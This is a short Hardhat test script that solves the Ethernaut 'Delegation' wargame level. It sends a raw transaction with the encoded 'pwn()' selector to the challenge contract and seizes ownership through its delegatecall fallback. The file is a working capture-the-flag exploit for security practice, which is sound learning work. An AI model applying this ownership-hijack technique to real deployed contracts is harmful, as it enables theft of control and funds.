import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Delegation`);
    const challengeAddress = await createChallenge(
        `0xF781b45d11A37c51aabBa1197B61e6397aDf1f78`
    );
    challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    let owner = await challenge.callStatic.owner();
    console.log("origin owner: " + owner);
    // 注意先构造出函数的 call-function-data
    const abi = ["function pwn() public"];
    const pwnInterface = new ethers.utils.Interface(abi);
    const callData = pwnInterface.encodeFunctionData("pwn", []);
    let tx = {
        to: challenge.address,
        data: callData,
        gasPrice: ethers.utils.parseUnits("3", "gwei"),
        gasLimit: 2100000,
    };
    const rep = await eoa.sendTransaction(tx);
    await rep.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
